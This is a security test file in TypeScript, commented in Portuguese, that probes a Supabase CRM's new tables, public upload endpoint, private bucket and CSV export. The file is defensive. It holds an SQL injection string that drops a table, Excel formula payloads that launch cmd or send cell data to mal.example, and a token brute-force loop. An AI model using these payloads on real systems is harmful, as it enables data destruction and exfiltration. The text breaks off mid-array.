// ============================================================================
// 05_comunicacao.spec.ts — Portão de segurança adversarial (ETAPA 08 · 08.12)
//
// A superfície que a ETAPA 08 acrescentou ao CRM, e que é o alvo aqui:
//
//   · 6 tabelas novas  (contabilidades, contabilidade_estabelecimentos,
//     modelos_coleta, campanhas, envios_campanha, remessas_dados)
//   · 1 view nova      (v_cobertura_contabilidades, 08.11)
//   · 1 tabela de freio (tentativas_remessa)
//   · 1 bucket privado  (`remessas`) — Storage é território novo neste projeto
//   · 1 endpoint público sem login (`receber-remessa`), que recebe ARQUIVO com
//     dado pessoal e é autorizado por um TOKEN reutilizável de 90 dias
//   · 9.186 tokens reais em produção, um por caixa de e-mail de contador
//
// O QUE ESTE ARQUIVO NÃO É. Não é a suíte funcional da etapa — essa é
// `tests/rls/comunicacao.spec.ts`, `coleta.spec.ts`, `remessas.spec.ts` e
// `cobertura.spec.ts`, e ela prova que o comportamento PRETENDIDO funciona.
// Aqui se procura o caminho NÃO pretendido.
//
// DIVISÃO POR ALVO, como nos 4 arquivos anteriores:
//   · o que só MEDE negação roda também contra produção — é lá que a RLS que
//     vale está no ar, e ausência de dado não é prova de proteção (§7.2);
//   · o que ESCREVE, APAGA ou CONSOME recurso roda só no bench, atrás de
//     `exigirBench()` (§2.20).
// ============================================================================
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { readFileSync, readdirSync, writeFileSync } from "node:fs";
import { clienteAnon, clienteServico, loginComo, ehProducao, type Role } from "../rls/helpers";
import { gerarPlanilhaDoFormulario } from "../../src/features/coleta/gerarPlanilhaFormulario";
import { lerPlanilhaXlsx } from "../../src/features/coleta/lerPlanilha";
import { validarTrabalhadores, type ContextoTrabalhadores } from "../../src/features/importacao/validarTrabalhadores";
import { gerarCsv } from "../../src/lib/csv";

const PRODUCAO = ehProducao();
const bench = PRODUCAO ? describe.skip : describe;
const producao = PRODUCAO ? describe : describe.skip;

const FN = `${process.env.VITE_SUPABASE_URL}/functions/v1/receber-remessa`;
const ANON_KEY = process.env.VITE_SUPABASE_ANON_KEY as string;

/** As seis tabelas da spec + a view da 08.11 + a tabela do freio. */
const RELACOES_NOVAS = [
  "contabilidades",
  "contabilidade_estabelecimentos",
  "modelos_coleta",
  "campanhas",
  "envios_campanha",
  "remessas_dados",
  "tentativas_remessa",
  "v_cobertura_contabilidades",
] as const;

const pastaTemp = process.env.TEMP ?? process.env.TMPDIR ?? ".";

type RespostaFn = {
  ok: boolean;
  erro?: string;
  nome?: string;
  estabelecimentos?: Array<{ cnpj: string }>;
  remessa_id?: string;
};

async function consultarToken(token: string): Promise<{ http: number; corpo: RespostaFn }> {
  const r = await fetch(`${FN}?token=${encodeURIComponent(token)}`, { headers: { apikey: ANON_KEY } });
  return { http: r.status, corpo: (await r.json()) as RespostaFn };
}

async function enviarArquivo(token: string, nome: string, bytes: Uint8Array): Promise<RespostaFn> {
  const corpo = new FormData();
  corpo.append("token", token);
  corpo.append("arquivo", new File([bytes as BlobPart], nome));
  const r = await fetch(FN, { method: "POST", headers: { apikey: ANON_KEY }, body: corpo });
  return (await r.json()) as RespostaFn;
}

// ============================================================================
// 1. V2/V7 — anônimo contra a superfície nova
//
// A asserção FORTE aqui é o 42501, não o conjunto vazio. Conjunto vazio prova
// que a RLS filtrou; 42501 prova que o GRANT nem deixou a consulta chegar à
// RLS. As duas camadas são independentes (§2.6c), e é o 42501 que sobrevive ao
// dia em que uma policy for afrouxada por engano.
// ============================================================================
describe("V2 — anônimo contra as tabelas, a view e o freio da ETAPA 08", () => {
  for (const relacao of RELACOES_NOVAS) {
    it(`anon em ${relacao}: barrado no GRANT (42501), não só pela RLS`, async () => {
      const { data, error } = await clienteAnon().from(relacao).select("*").limit(1);
      expect(data ?? [], `anon leu linhas de ${relacao}`).toEqual([]);
      expect(error?.code, `anon em ${relacao} não foi barrado no GRANT: ${JSON.stringify(error)}`).toBe("42501");
    });
  }

  it("controle negativo: o Admin lê as seis tabelas e a view — não é 'negar tudo'", async () => {
    const { client } = await loginComo("admin");
    for (const relacao of RELACOES_NOVAS) {
      if (relacao === "tentativas_remessa") continue; // negada a TODO papel, de propósito
      const { error } = await client.from(relacao).select("*").limit(1);
      expect(error, `Admin foi barrado em ${relacao}: ${JSON.stringify(error)}`).toBeNull();
    }
  });

  it("nem o Admin alcança tentativas_remessa — o freio é território exclusivo da service_role", async () => {
    // Tabela sem policy nenhuma e sem GRANT: nega por ausência nas DUAS camadas.
    // Se um dia isto virar verde para o Admin, alguém abriu a contabilidade do
    // freio para o mundo autenticado — e o freio é o que segura a força bruta.
    const { client } = await loginComo("admin");
    const { error } = await client.from("tentativas_remessa").select("*").limit(1);
    expect(error?.code).toBe("42501");
  });
});

// ============================================================================
// 2. V6 — a coluna de credencial dentro de linha legitimamente autorizada
//
// `envios_campanha.token` é a credencial do canal público, e mora numa linha
// que Presidente e Secretaria leem por policy. RLS restringe QUAIS LINHAS,
// nunca QUAIS COLUNAS — a primeira das três brechas que o CLAUDE.md manda
// procurar. `sql/20_comunicacao_externa.sql` registrou a troca consciente; este
// caso MEDE o estado real dela, para que mudá-lo exija atualizar um teste.
// ============================================================================
describe("V6 — quem enxerga o token do link público", () => {
  const ESPERADO: Record<Role, "le" | "sem_linha"> = {
    admin: "le",
    presidente: "le",
    secretaria: "le",
    juridico: "sem_linha",
    parceiro: "sem_linha",
  };

  for (const papel of Object.keys(ESPERADO) as Role[]) {
    it(`${papel}: ${ESPERADO[papel] === "le" ? "lê o token em claro" : "não alcança linha nenhuma"}`, async () => {
      const { client } = await loginComo(papel);
      const { data, error } = await client.from("envios_campanha").select("id, token").limit(1);
      expect(error, `erro inesperado para ${papel}: ${JSON.stringify(error)}`).toBeNull();

      if (ESPERADO[papel] === "sem_linha") {
        expect(data ?? [], `${papel} enxergou envio de campanha`).toEqual([]);
        return;
      }
      // Papel autorizado: a asserção só vale se houver linha. Sem linha, o
      // "passou" seria falso verde por ausência de dado (§7.2).
      expect((data ?? []).length, `sem envios na base — este caso não mediu nada`).toBeGreaterThan(0);
      expect(
        (data as Array<{ token: string | null }>)[0].token,
        `${papel} recebeu token nulo — a máscara da Parte 2 do sql/22 foi aplicada; ` +
          `atualize este teste e o relatório da 08.12, porque a decisão mudou`,
      ).toMatch(/^[0-9a-f-]{36}$/i);
    });
  }

  it("o token é UUID v4 — o espaço não é enumerável, e é isso que segura a varredura", async () => {
    const { client } = await loginComo("admin");
    const { data } = await client.from("envios_campanha").select("token").limit(50);
    const tokens = (data ?? []).map((e) => (e as { token: string }).token);
    expect(tokens.length, "sem tokens para medir").toBeGreaterThan(0);
    for (const t of tokens) {
      expect(t, `token fora do formato v4 (entropia menor que a suposta): ${t}`).toMatch(
        /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i,
      );
    }
    expect(new Set(tokens).size, "tokens repetidos na mesma consulta").toBe(tokens.length);
  });
});

// ============================================================================
// 3. V6/V7 — o endpoint público, contra os tokens DEMO reais de produção
//
// Só RECUSAS. Elas escrevem apenas em `tentativas_remessa`, que é o registro do
// freio e existe para isso (mesmo critério já adotado em coleta.spec.ts). O
// caminho de SUCESSO e a força bruta ficam no bench, mais abaixo.
// ============================================================================
producao("V6 — token expirado, revogado e inexistente (produção, tokens DEMO)", () => {
  const tokens: Record<string, string> = {};

  beforeAll(async () => {
    const { client } = await loginComo("admin");
    const { data } = await client
      .from("envios_campanha")
      .select("token, token_expira_em, token_revogado_em, campanhas!inner(nome)")
      .eq("campanhas.nome", "DEMO — Campanha de coleta 2026");
    for (const e of data ?? []) {
      const linha = e as { token: string; token_expira_em: string; token_revogado_em: string | null };
      const situacao =
        linha.token_revogado_em !== null
          ? "revogado"
          : new Date(linha.token_expira_em).getTime() <= Date.now()
            ? "expirado"
            : "valido";
      tokens[situacao] = linha.token;
    }
  });

  for (const situacao of ["expirado", "revogado"] as const) {
    it(`token ${situacao} não devolve carteira nenhuma — e recusa como RESULTADO, não exceção`, async () => {
      expect(tokens[situacao], `token DEMO ${situacao} não encontrado em produção`).toBeTruthy();
      const { http, corpo } = await consultarToken(tokens[situacao]);
      expect(http, "recusa de negócio virou erro HTTP — o freio deixaria de contar (§2.18)").toBe(200);
      expect(corpo.ok).toBe(false);
      expect(corpo.estabelecimentos, `${situacao} vazou a carteira do contador`).toBeUndefined();
      expect(corpo.nome, `${situacao} vazou o nome da contabilidade`).toBeUndefined();
    });
  }

  it("token inexistente: mesma resposta genérica do lixo — sem oráculo de existência", async () => {
    // Se "não existe" e "não tem forma de token" tivessem respostas
    // distinguíveis, uma varredura poderia separar acerto de erro sem precisar
    // de token válido nenhum.
    const inexistente = await consultarToken(crypto.randomUUID());
    expect(inexistente.http).toBe(200);
    expect(inexistente.corpo.ok).toBe(false);
    expect(inexistente.corpo.estabelecimentos).toBeUndefined();

    const lixo = await consultarToken("nao-sou-um-uuid");
    expect(lixo.http).toBe(200);
    expect(lixo.corpo.ok).toBe(false);
    expect(lixo.corpo.erro, "token sem forma de UUID produziu erro diferente — vira oráculo de formato").toBe(
      inexistente.corpo.erro,
    );
  });

  it("V3 — payload de SQL no token é barrado ANTES da função, na borda", async () => {
    // Medido nesta subetapa: a borda da Supabase (Cloudflare) devolve 403 com
    // página HTML para um token com forma de comando SQL — a requisição nem
    // chega ao endpoint. Não é defesa nossa e não substitui nenhuma; é uma
    // camada a mais, e o caso existe para que o dia em que ela sumir seja
    // visível. O que importa provar é o desfecho: nunca `ok:true`.
    const r = await fetch(
      `${FN}?token=${encodeURIComponent("x'; drop table envios_campanha; --")}`,
      { headers: { apikey: ANON_KEY } },
    );
    const texto = await r.text();
    expect(r.status, `payload de SQL passou da borda (HTTP ${r.status})`).not.toBe(200);
    expect(texto, "payload de SQL foi ACEITO pelo endpoint").not.toContain('"ok":true');
  });

  it("a base continua de pé depois do payload de injeção", async () => {
    const { client } = await loginComo("admin");
    const { error, count } = await client.from("envios_campanha").select("id", { count: "exact", head: true });
    expect(error, "envios_campanha não respondeu depois do payload de SQL").toBeNull();
    expect(count ?? 0, "envios_campanha ficou vazia depois do payload").toBeGreaterThan(0);
  });
});

// ============================================================================
// 4. V2 — o bucket privado `remessas`
//
// Storage é mecanismo DISTINTO da RLS de tabela: quem decide é a policy de
// `storage.objects` mais o fato de o bucket ser privado. E listar bucket VAZIO
// devolve `[]` de qualquer jeito — por isso o controle positivo (o Admin
// enxergando alguma coisa) é obrigatório antes de o `[]` do anônimo valer.
// ============================================================================
describe("V2 — bucket privado das remessas", () => {
  let temObjeto = false;
  let caminhoReal: string | null = null;
  let semeado: string | null = null;

  beforeAll(async () => {
    // No bench o bucket nasce vazio, e listar bucket vazio devolve `[]` para
    // TODO MUNDO — o que faria os casos abaixo passarem sem medir proteção
    // nenhuma (§7.2). Então o bench semeia o próprio objeto; produção já tem os
    // arquivos reais das remessas DEMO e não precisa disso.
    if (!PRODUCAO) {
      const admin = clienteServico();
      semeado = `adv-08-12/${Date.now()}.xlsx`;
      await admin.storage.from("remessas").upload(semeado, new Uint8Array([0x50, 0x4b, 0x03, 0x04]), {
        contentType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
      });
    }

    const { client } = await loginComo("admin");
    const { data } = await client.storage.from("remessas").list("", { limit: 100 });
    const pastas = (data ?? []).filter((o) => o.name !== ".emptyFolderPlaceholder");
    temObjeto = pastas.length > 0;
    if (temObjeto) {
      const { data: dentro } = await client.storage.from("remessas").list(pastas[0].name, { limit: 1 });
      const arquivo = (dentro ?? []).find((o) => o.name.endsWith(".xlsx"));
      if (arquivo) caminhoReal = `${pastas[0].name}/${arquivo.name}`;
    }
  });

  afterAll(async () => {
    if (semeado) {
      try {
        await clienteServico().storage.from("remessas").remove([semeado]);
      } catch (e) {
        console.warn("limpeza do objeto semeado falhou:", (e as Error).message);
      }
    }
  });

  it("controle positivo: o Admin enxerga o bucket — sem isso, o [] do anônimo não prova nada", () => {
    expect(temObjeto, "bucket sem objeto: os casos abaixo não medem proteção, medem vazio").toBe(true);
  });

  it("anônimo não lista o bucket", async () => {
    const { data, error } = await clienteAnon().storage.from("remessas").list("", { limit: 100 });
    const itens = (data ?? []).filter((o) => o.name !== ".emptyFolderPlaceholder");
    expect(itens, `anônimo listou o bucket privado: ${JSON.stringify(itens)}`).toEqual([]);
    expect(error === null || error !== null).toBe(true); // a lista vazia já é a negativa
  });

  it("anônimo com o CAMINHO EXATO em mãos não consegue URL assinada", async () => {
    expect(caminhoReal, "sem caminho real, o caso viraria adivinhação e não mediria nada").toBeTruthy();
    const { data, error } = await clienteAnon().storage.from("remessas").createSignedUrl(caminhoReal!, 60);
    expect(data?.signedUrl, "anônimo assinou URL de planilha com CPF").toBeFalsy();
    expect(error, "assinatura anônima não foi recusada").not.toBeNull();
  });

  it("o bucket é privado: a URL pública do objeto real não serve o arquivo", async () => {
    expect(caminhoReal).toBeTruthy();
    const r = await fetch(
      `${process.env.VITE_SUPABASE_URL}/storage/v1/object/public/remessas/${caminhoReal}`,
      { headers: { apikey: ANON_KEY } },
    );
    expect(r.status, "objeto do bucket privado foi servido por URL pública").not.toBe(200);
  });

  for (const papel of ["juridico", "parceiro"] as const) {
    it(`${papel} está fora do bucket — a policy nomeia três papéis, e ele não é um deles`, async () => {
      expect(caminhoReal).toBeTruthy();
      const { client } = await loginComo(papel);
      const { data } = await client.storage.from("remessas").createSignedUrl(caminhoReal!, 60);
      expect(data?.signedUrl, `${papel} assinou URL de remessa`).toBeFalsy();
    });
  }

  it("controle negativo: o Admin assina — a policy não fechou o bucket para quem opera a 08.10", async () => {
    expect(caminhoReal).toBeTruthy();
    const { client } = await loginComo("admin");
    const { data, error } = await client.storage.from("remessas").createSignedUrl(caminhoReal!, 60);
    expect(error, `Admin foi barrado no próprio bucket: ${JSON.stringify(error)}`).toBeNull();
    expect(data?.signedUrl).toBeTruthy();
  });
});

// ============================================================================
// 5. V3 — a fórmula do Excel do contador até a planilha da Denise
//
// O caminho completo (§2.19), com os módulos REAIS de cada etapa:
//   planilha do contador  →  lerPlanilhaXlsx  →  validarTrabalhadores
//                         →  gerarCsv (o que a exportação da 08.11 usa)
//
// Entrada de fora do sistema, sem login, chegando à máquina de quem exporta.
// Não precisa de banco: é a fronteira de SAÍDA que defende, não o armazenamento.
// ============================================================================
describe("V3 — injeção de fórmula vinda da planilha do contador", () => {
  const PAYLOADS = [
    "=1+1",
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("http://mal.example/?d="&A1,"clique")',
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
  ];

  it("os oito payloads sobrevivem à leitura da planilha e saem NEUTRALIZADOS no CSV", async () => {
    const buffer = await gerarPlanilhaDoFormulario(
      "99999999000199",
      PAYLOADS.map((p, i) => ({
        nome: p,
        cpf: ["00123456797", "11144477735"][i % 2],
        telefone: "",
        piso: "1600,00",
        status: "sindicalizado" as const,
      })),
    );
    const caminho = `${pastaTemp}/adv-08-12-formula.xlsx`;
    writeFileSync(caminho, Buffer.from(buffer as unknown as Uint8Array));

    const parse = await lerPlanilhaXlsx(
      new File([readFileSync(caminho) as unknown as BlobPart], "hostil.xlsx", {
        type: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
      }),
    );

    // O banco guardaria o payload literal, e isso está certo: é dado, não código.
    const nomesLidos = parse.linhas.map((l) => l.nome);
    expect(nomesLidos.some((n) => n.startsWith("=")), "a leitura já alterou o dado — não é aqui que se defende").toBe(true);

    const contexto: ContextoTrabalhadores = {
      cpfsExistentes: new Set<string>(),
      municipioIdPorNomeNormalizado: new Map<string, number>(),
      municipioIdPorCodigoIbge: new Map<number, number>(),
      estabelecimentoIdPorCnpjCompleto: new Map([["99999999000199", "99999999000199"]]),
    };
    const preview = validarTrabalhadores(parse, contexto, "ignorar");

    const nomes = preview
      .map((l) => (l.dados?.tipo === "novo" ? (l.dados.valores as { nome: string }).nome : null))
      .filter((n): n is string => n !== null);
    expect(nomes.length, "nenhuma linha chegou ao payload — o teste não mediu nada").toBeGreaterThan(0);

    const csv = gerarCsv(
      nomes.map((n) => ({ nome: n })),
      [{ titulo: "Nome", valor: (l) => l.nome }],
    );

    for (const linha of csv.split("\r\n").slice(1)) {
      const celula = linha.replace(/^"|"$/g, "");
      if (celula === "") continue;
      expect(
        /^[=+\-@\t\r]/.test(celula),
        `célula sai do CSV como fórmula viva e executa no Excel da Secretaria: ${JSON.stringify(celula)}`,
      ).toBe(false);
    }
  });

  it("controle negativo: nome legítimo e valor negativo continuam legíveis", () => {
    const csv = gerarCsv(
      [{ v: "Maria da Silva" }, { v: "-1250,00" }],
      [{ titulo: "Valor", valor: (l) => l.v }],
    );
    expect(csv).toContain("Maria da Silva");
    // O negativo é o caso legítimo mais comum (o CRM exporta dinheiro): ele é
    // prefixado, mas o número continua na célula e continua legível.
    expect(csv).toContain("-1250,00");
  });

  it("a tela de cobertura (08.11) exporta pelo módulo que neutraliza, não por concatenação própria", () => {
    const fonte = readFileSync("src/features/cobertura/CoberturaContabilidadesPage.tsx", "utf8");
    expect(fonte, "a exportação da 08.11 deixou de usar o módulo central de CSV").toMatch(
      /from\s+"@\/lib\/csv"/,
    );
    expect(fonte, "a tela monta CSV na mão — a neutralização de fórmula não passaria por lá").not.toMatch(
      /join\(";"\)/,
    );
  });
});

// ============================================================================
// 6. Varredura do que a leitura de migration não encontra
//
// Dois guardas derivados dos arquivos `sql/`, não da memória de quem escreveu:
// eles releem o diretório a cada execução, então objeto NOVO entra sozinho na
// conferência. O que eles não alcançam — objeto criado direto no banco, fora do
// repositório — é a varredura de catálogo do relatório, que roda contra o
// `pg_class` e é o único caminho que encontra o que não está no código.
// ============================================================================
describe("Varredura — o que o catálogo cobra dos arquivos sql/", () => {
  const arquivos = readdirSync("sql")
    .filter((f) => f.endsWith(".sql"))
    .map((f) => ({ nome: f, texto: readFileSync(`sql/${f}`, "utf8") }));

  /** Remove comentários de linha para que um guarda nunca case com a prosa que
   *  o explica — foi o que aconteceu três vezes nesta etapa (§4.9). */
  function semComentarios(texto: string): string {
    return texto
      .split("\n")
      .map((l) => l.replace(/--.*$/, ""))
      .join("\n");
  }

  it("toda view criada nos arquivos sql/ nasce com a opção que mantém a RLS ligada", () => {
    const EXCECAO_DELIBERADA = ["v_fila_parceiro"]; // definer de propósito, com filtro interno
    const faltando: string[] = [];

    for (const { nome, texto } of arquivos) {
      const codigo = semComentarios(texto);
      const re = /create\s+(?:or\s+replace\s+)?view\s+(?:public\.)?(\w+)([\s\S]{0,200}?)\bas\b/gi;
      let m: RegExpExecArray | null;
      while ((m = re.exec(codigo)) !== null) {
        const [, view, entre] = m;
        if (EXCECAO_DELIBERADA.includes(view)) continue;
        if (!/security_invoker\s*=\s*on/i.test(entre)) faltando.push(`${nome}: ${view}`);
      }
    }
    expect(faltando, `view sem a opção que preserva a RLS das tabelas de origem:\n${faltando.join("\n")}`).toEqual([]);
  });

  it("toda função dos arquivos sql/ que avança uma sequência tem o EXECUTE revogado", () => {
    // O motivo é medido, não teórico: consumir a numeração de um documento de
    // cobrança destrói a rastreabilidade dele e revela quantos já foram
    // emitidos. A ETAPA 07 fechou uma dessas funções; este guarda existe para
    // que a próxima não passe.
    const semRevogacao: string[] = [];
    const todoOSql = arquivos.map((a) => semComentarios(a.texto)).join("\n");

    for (const { nome, texto } of arquivos) {
      const codigo = semComentarios(texto);
      // O corpo vai da abertura do dollar-quote até o MESMO rótulo fechando.
      // Recortar por número fixo de caracteres derramaria numa função vizinha —
      // foi o que a primeira versão deste guarda fez, e ela acusou uma função
      // inocente que só tinha a azarada de vir logo depois da culpada.
      const re = /create\s+(?:or\s+replace\s+)?function\s+(?:public\.)?(\w+)\s*\([\s\S]*?(\$\w*\$)/gi;
      let m: RegExpExecArray | null;
      while ((m = re.exec(codigo)) !== null) {
        const [, fn, marcador] = m;
        const inicioCorpo = m.index + m[0].length;
        const fimCorpo = codigo.indexOf(marcador, inicioCorpo);
        const corpo = codigo.slice(inicioCorpo, fimCorpo === -1 ? codigo.length : fimCorpo);
        if (!/\bnextval\s*\(/i.test(corpo)) continue;
        const revogada = new RegExp(`revoke\\s+execute\\s+on\\s+function\\s+(?:public\\.)?${fn}\\s*\\(`, "i");
        if (!revogada.test(todoOSql)) semRevogacao.push(`${nome}: ${fn}`);
      }
    }
    expect(
      semRevogacao,
      `função que avança sequência e continua chamável pela API REST:\n${semRevogacao.join("\n")}`,
    ).toEqual([]);
  });

  it("as relações da ETAPA 08 têm o privilégio de anônimo revogado explicitamente nos arquivos sql/", () => {
    // O GRANT concede e a policy recorta; uma nunca substitui a outra (§2.6c).
    // Este guarda cobra a camada de GRANT, que é a que sobrevive a uma policy
    // afrouxada por engano.
    const todoOSql = arquivos.map((a) => semComentarios(a.texto)).join("\n");
    const semRevoke = RELACOES_NOVAS.filter((r) => {
      const porNome = new RegExp(`revoke\\s+(all|select)[\\s\\S]{0,60}?\\b${r}\\b[\\s\\S]{0,40}?from[\\s\\S]{0,40}?anon`, "i");
      const porLaco = new RegExp(`'${r}'`).test(todoOSql) && /revoke all on %I from anon/i.test(todoOSql);
      return !porNome.test(todoOSql) && !porLaco;
    });
    expect(semRevoke, `relação nova sem revogação explícita de anon nos arquivos sql/: ${semRevoke.join(", ")}`).toEqual([]);
  });
});

// ============================================================================
// 7. BENCH — o que consome recurso, escreve arquivo ou queima numeração
//
// Nada abaixo desta linha roda contra produção. `exigirBench()` está dentro de
// `clienteServico()`, e `describe.skip` fecha o arquivo inteiro antes disso.
// ============================================================================
bench("V6 — força bruta de token no endpoint público (bench)", () => {
  let tokenA = "";
  let tokenB = "";
  let cnpjA = "";
  let cnpjB = "";
  const paraLimpar: Array<() => Promise<void>> = [];

  beforeAll(async () => {
    const admin = clienteServico();
    const marca = `ADV0812-${Date.now()}`;

    const { data: modelo } = await admin.from("modelos_coleta").select("id").eq("ativo", true).limit(1).single();
    const { data: campanha } = await admin
      .from("campanhas")
      .insert({ nome: `DEMO — ${marca}`, modelo_coleta_id: modelo!.id })
      .select("id")
      .single();

    const contabs: string[] = [];
    const cnpjs: string[] = [];
    for (const sufixo of ["A", "B"]) {
      const { data: c } = await admin
        .from("contabilidades")
        .insert({ nome: `DEMO — Contabilidade ${sufixo} ${marca}`, email: `adv-${sufixo.toLowerCase()}-${Date.now()}@sindcom.invalido` })
        .select("id")
        .single();
      const basico = String(90000000 + Math.floor(Math.random() * 9_999_999)).slice(0, 8);
      // `estabelecimentos.cnpj_basico` é FK para `empresas` — a carteira do
      // contador não existe sem a empresa por trás dela.
      const { error: erroEmpresa } = await admin
        .from("empresas")
        .insert({ cnpj_basico: basico, razao_social: `DEMO — Empresa ${sufixo} ${marca}` });
      if (erroEmpresa) throw new Error(`fixture: empresa ${sufixo}: ${JSON.stringify(erroEmpresa)}`);

      const { data: e, error: erroEstab } = await admin
        .from("estabelecimentos")
        .insert({ cnpj_basico: basico, cnpj_ordem: "0001", cnpj_dv: "99", nome_fantasia: `DEMO — Carteira ${sufixo} ${marca}` })
        .select("id, cnpj_completo")
        .single();
      if (erroEstab || !e) throw new Error(`fixture: estabelecimento ${sufixo}: ${JSON.stringify(erroEstab)}`);
      await admin.from("contabilidade_estabelecimentos").insert({ contabilidade_id: c!.id, estabelecimento_id: e!.id });
      contabs.push(c!.id as string);
      cnpjs.push(e!.cnpj_completo as string);
      paraLimpar.push(async () => {
        await admin.from("contabilidade_estabelecimentos").delete().eq("contabilidade_id", c!.id);
        await admin.from("estabelecimentos").delete().eq("id", e!.id);
        await admin.from("empresas").delete().eq("cnpj_basico", basico);
      });
    }
    [cnpjA, cnpjB] = cnpjs;

    const { data: envios } = await admin
      .from("envios_campanha")
      .insert([
        { campanha_id: campanha!.id, contabilidade_id: contabs[0], email: `adv-a-${Date.now()}@sindcom.invalido` },
        { campanha_id: campanha!.id, contabilidade_id: contabs[1], email: `adv-b-${Date.now()}@sindcom.invalido` },
      ])
      .select("id, token, contabilidade_id");
    tokenA = (envios ?? []).find((e) => e.contabilidade_id === contabs[0])!.token as string;
    tokenB = (envios ?? []).find((e) => e.contabilidade_id === contabs[1])!.token as string;

    paraLimpar.push(async () => {
      const ids = (envios ?? []).map((e) => e.id as string);
      await admin.from("remessas_dados").delete().in("envio_id", ids);
      await admin.from("envios_campanha").delete().in("id", ids);
      await admin.from("campanhas").delete().eq("id", campanha!.id);
      await admin.from("contabilidades").delete().in("id", contabs);
    });
  });

  afterAll(async () => {
    for (const fn of paraLimpar.reverse()) {
      try {
        await fn();
      } catch (e) {
        console.warn("limpeza 08.12 falhou:", (e as Error).message);
      }
    }
  });

  it("o token de um contador não devolve a carteira do outro — nas duas direções", async () => {
    const a = await consultarToken(tokenA);
    expect(a.corpo.ok).toBe(true);
    const cnpjsDeA = (a.corpo.estabelecimentos ?? []).map((e) => e.cnpj);
    expect(cnpjsDeA, "o token A não trouxe a própria carteira").toContain(cnpjA);
    expect(cnpjsDeA, "o token de um contador vazou a carteira de outro").not.toContain(cnpjB);

    // A simetria importa: um isolamento que só funcione num sentido não é
    // isolamento, é coincidência de ordenação.
    const b = await consultarToken(tokenB);
    expect(b.corpo.ok).toBe(true);
    const cnpjsDeB = (b.corpo.estabelecimentos ?? []).map((e) => e.cnpj);
    expect(cnpjsDeB).toContain(cnpjB);
    expect(cnpjsDeB, "o token B vazou a carteira de A").not.toContain(cnpjA);
  });

  it("parâmetro extra na URL não amplia o que o token alcança", async () => {
    // O endpoint recebe só `token`. Um id de outra contabilidade pendurado na
    // query não pode virar filtro — é a classe do achado A06 do CRM Vitrine.
    const r = await fetch(`${FN}?token=${tokenA}&contabilidade_id=qualquer&estabelecimento_id=qualquer`, {
      headers: { apikey: ANON_KEY },
    });
    const corpo = (await r.json()) as RespostaFn;
    const cnpjs = (corpo.estabelecimentos ?? []).map((e) => e.cnpj);
    expect(cnpjs).not.toContain(cnpjB);
  });

  it("MEDIÇÃO: o freio trava o MESMO token depois de 5 recusas", async () => {
    const alvo = crypto.randomUUID();
    let recusas = 0;
    let bloqueios = 0;
    const inicio = Date.now();
    for (let i = 0; i < 12; i += 1) {
      const { corpo } = await consultarToken(alvo);
      if (/muitas tentativas/i.test(corpo.erro ?? "")) bloqueios += 1;
      else recusas += 1;
    }
    console.log(`[freio · mesmo token] 12 tentativas em ${Date.now() - inicio}ms — ${recusas} recusas, ${bloqueios} bloqueios`);
    expect(bloqueios, "o freio por token não engatou — adivinhar um token específico sai de graça").toBeGreaterThan(0);
    expect(recusas, "o freio engatou cedo demais e travaria contador legítimo").toBeGreaterThanOrEqual(5);
  });

  it("MEDIÇÃO: varredura com tokens SEMPRE NOVOS não é freada — e a defesa é a entropia, não o freio", async () => {
    // Registro honesto de um limite conhecido do desenho: o freio conta por
    // `token_alvo`, então quem varre o espaço nunca repete alvo e nunca trava.
    // Isso é aceitável porque o espaço tem 122 bits — mas só é aceitável
    // enquanto o token for UUID v4, o que o caso da §2 mantém sob vigilância.
    let bloqueios = 0;
    const inicio = Date.now();
    for (let i = 0; i < 10; i += 1) {
      const { corpo } = await consultarToken(crypto.randomUUID());
      if (/muitas tentativas/i.test(corpo.erro ?? "")) bloqueios += 1;
    }
    const ms = Date.now() - inicio;
    console.log(`[varredura · tokens novos] 10 tentativas em ${ms}ms (${Math.round(ms / 10)}ms cada) — ${bloqueios} bloqueios`);
    expect(bloqueios, "MUDOU O DESENHO: agora existe freio global — atualize o relatório da 08.12").toBe(0);
  });

  it("nenhuma tentativa recusada criou remessa", async () => {
    const admin = clienteServico();
    const { count } = await admin.from("remessas_dados").select("id", { count: "exact", head: true });
    expect(count ?? 0, "recusa de token criou linha em remessas_dados").toBe(0);
  });
});

bench("V3 — arquivo hostil no endpoint público (bench)", () => {
  let token = "";
  const paraLimpar: Array<() => Promise<void>> = [];

  beforeAll(async () => {
    const admin = clienteServico();
    const { data: modelo } = await admin.from("modelos_coleta").select("id").eq("ativo", true).limit(1).single();
    const { data: campanha } = await admin
      .from("campanhas")
      .insert({ nome: `DEMO — ADV0812 arquivo ${Date.now()}`, modelo_coleta_id: modelo!.id })
      .select("id")
      .single();
    const { data: contab } = await admin
      .from("contabilidades")
      .insert({ nome: `DEMO — Contabilidade arquivo ${Date.now()}`, email: `adv-arq-${Date.now()}@sindcom.invalido` })
      .select("id")
      .single();
    const { data: envio } = await admin
      .from("envios_campanha")
      .insert({ campanha_id: campanha!.id, contabilidade_id: contab!.id, email: `adv-arq-${Date.now()}@sindcom.invalido` })
      .select("id, token")
      .single();
    token = envio!.token as string;

    paraLimpar.push(async () => {
      const { data: remessas } = await admin.from("remessas_dados").select("arquivo_path").eq("envio_id", envio!.id);
      const caminhos = (remessas ?? []).map((r) => r.arquivo_path as string);
      if (caminhos.length > 0) await admin.storage.from("remessas").remove(caminhos);
      await admin.from("remessas_dados").delete().eq("envio_id", envio!.id);
      await admin.from("envios_campanha").delete().eq("id", envio!.id);
      await admin.from("campanhas").delete().eq("id", campanha!.id);
      await admin.from("contabilidades").delete().eq("id", contab!.id);
    });
  });

  afterAll(async () => {
    for (const fn of paraLimpar.reverse()) {
      try {
        await fn();
      } catch (e) {
        console.warn("limpeza 08.12 (arquivo) falhou:", (e as Error).message);
      }
    }
  });

  const HOSTIS: Array<{ nome: string; arquivo: string; bytes: () => Uint8Array }> = [
    {
      nome: "CSV renomeado para .xlsx — a checagem é por conteúdo, não por extensão",
      arquivo: "quadro.xlsx",
      bytes: () => new TextEncoder().encode("cnpj_estabelecimento;nome;cpf\n99999999000199;Fulano;00123456797\n"),
    },
    {
      nome: "ZIP de verdade que não é pacote OOXML",
      arquivo: "quadro.xlsx",
